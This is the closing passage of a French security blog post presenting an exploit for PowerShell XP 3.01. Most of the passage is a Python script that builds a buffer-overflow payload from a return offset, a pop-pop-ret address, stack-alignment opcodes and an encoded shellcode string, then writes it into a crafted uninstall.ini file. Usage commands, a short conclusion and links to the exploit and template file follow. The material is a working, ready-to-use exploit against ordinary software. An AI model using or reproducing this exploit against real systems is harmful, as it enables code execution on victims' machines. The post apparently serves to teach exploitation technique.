<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Usage: </span><span class="si">%</span><span class="s">s input output payload"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># get file content
</span><span class="n">infile</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1">#
</span><span class="n">fpayload</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">fpayload</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># first offset ... but not enough room
# ret_offset = 248
</span><span class="n">ret_offset</span> <span class="o">=</span> <span class="mi">5268</span>

<span class="c1"># pop pop ret
</span><span class="n">ret</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x9e\x13\x40\x00</span><span class="s">"</span>

<span class="n">ecx</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x45\x61\x39\x76</span><span class="s">"</span>
<span class="n">eax</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x47\x61\x39\x76</span><span class="s">"</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Constructing alignment code"</span><span class="p">)</span>
<span class="c1"># alignment code
# dec esp
# dec esp
# dec esp
# dec esp
</span><span class="n">align</span> <span class="o">=</span> <span class="s">'L'</span> <span class="o">*</span> <span class="mi">4</span>
<span class="c1"># push esp  ; save current esp register
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'T'</span>
<span class="c1"># pop edx   ; save in edx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'Z'</span>
<span class="c1"># pop esp (make esp point to data)
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span>
<span class="c1"># push edx  ; old esp register
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'R'</span>    <span class="c1"># edi
# popad
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'a'</span>

<span class="c1"># align += ecx
# align += eax
</span>
<span class="c1"># we get actual value (for later restore ;))
# pop ecx
# push ecx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x59\x51</span><span class="s">"</span>
<span class="c1"># push esp
# pop eax       ; here the code is adjusted but we still need to restore old stack
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'TX'</span>
<span class="c1"># we repatch the stack (or we may have bad memory access ;))
# push ecx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x51</span><span class="s">"</span>
<span class="c1"># we don't want our current instructions to be crushed
# dec esp * 4
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'L'</span> <span class="o">*</span> <span class="mi">8</span>
<span class="c1"># push edi  ; old stack
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'W'</span>
<span class="c1"># pop esp   ; restore old stack
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span>
<span class="c1"># junk bytes
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'K'</span> <span class="o">*</span> <span class="mi">4</span> <span class="c1"># scrape space (esp point here)
</span>
<span class="c1"># buffer need to be long enough ;)
</span><span class="k">print</span><span class="p">(</span><span class="s">"Padding"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Constructing payload"</span><span class="p">)</span>
<span class="n">msg</span> <span class="o">=</span> <span class="s">"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIhkS62xKYc5wpC0uP9xZUKOkOyonahlwP5PEPuPK9kUOySuc8kXf6Gp5Ps0Phnn0NdNzLPPm81yS05Ps0NiQUuPLKsmEXmQO38WePEP5PPSYoPUuPsXMxOR2mMlPPKXrnePgpwpOyG5Vd0h5P7p5PuPLKCm38mQksJB5PC05PpSLKSmS8NaiSJMgpgpwpQCSXwpuPS0GpKOpUTDlKBedHmks9uRWp5PvazxioKP01O0PdUS3ptp1hvlLKQPTLnkRPglnMNkcpS8XkUYNk1PttnmCpsLnksp7LySQpnkbLddQ4lKPE5lLKrtuUrX5Q8jLK3zTXNkQJ5peQXkysvWSyNkP4LKuQXnTq9otqyPKLNLMTKp444JyQXOTMWqKwyyIaKOKOKOwKcL145x45YNLK3jTdeQ8kCVNkflbkNk0ZULs18klKuTLKgqKXLIW4VDglE1hBUXWpt5cC1uBRUcGBfN2DPl0lWpaXpa2C2K3UpdTaup7JUyuPPPu1RWPnQuPdupsRaiUpBMcotqtpvQWpA"</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">msg</span> <span class="o">+</span> <span class="n">payload</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Payload size : </span><span class="si">%</span><span class="s">u"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="c1"># let's have the minimum correct buffer length!
</span><span class="n">padding</span> <span class="o">=</span> <span class="p">(</span><span class="n">ret_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">align</span><span class="p">))</span> <span class="o">*</span> <span class="s">'C'</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Constructing egg"</span><span class="p">)</span>
<span class="n">egg</span> <span class="o">=</span> <span class="n">align</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">ret</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Egg size : </span><span class="si">%</span><span class="s">u"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">egg</span><span class="p">))</span>

<span class="n">modified</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'TESTTEST'</span><span class="p">,</span> <span class="n">egg</span><span class="p">)</span>

<span class="c1"># working
</span><span class="n">outfile</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="k">print</span> <span class="p">(</span><span class="s">"Writing exploit file : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">outfile</span><span class="p">)</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
<span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">modified</span><span class="p">)</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Usage :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre>./alpha2 eax &lt; allocnewstack
./sploit.py uninstall.ini.tomod uninstall.ini <span class="o">[</span>payload]</pre></td></tr></tbody></table></code></pre></figure>

<p>Le fichiers nécessaire uninstall.ini.tomod est fourni en fin d’article.</p>

<h1 id="conclusion">Conclusion</h1>

<p>Comment quoi on aura pu voir que les overflow ne se déroulent pas qu’en stack,
mais aussi dans toutes les autres sections ou on peut écrire/exécuter du code ;).
En plus de tout ça, un avant-goût a été donné sur le shellcoding windows.</p>

<p>J’espère que ça vous a plut,</p>

<p>Have fun,</p>

<p>m_101</p>

<h1 id="ressources">Ressources</h1>

<ul>
  <li>[URL] <a href="http://www-verimag.imag.fr/~moy/?Drawstack-sty-Easily-draw-stack%5Cnewline">Dessinez des stacks en LaTeX</a></li>
  <li>[URL] <a href="http://www.softpedia.com/get/System/OS-Enhancements/PowerShell-XP.shtml">PowerShell XP 3.01</a></li>
  <li>[Fichier] <a href="/assets/others/uninstall.ini">uninstall.ini.tomod</a></li>
  <li>[Exploit] <a href="http://pastebin.com/Lha6HTsh">PowerShell XP 3.01 exploit</a></li>
</ul>

  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/2010/11/30/exploit-xion-audio-player-10126-buffer.html">Previous : [Exploit] Xion Audio Player 1.0.126 Buffer Overflow Vulnerability</a>
    

    
    <a class="post-next" href="/2011/02/02/reversing-ge0s-keygenme-fast.html">Next : [Reversing] Ge0's KeygenMe fast</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/2010/12/11/exploit-powershell-301-0day.html";
            this.page.identifier = "/2010/12/11/exploit-powershell-301-0day";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
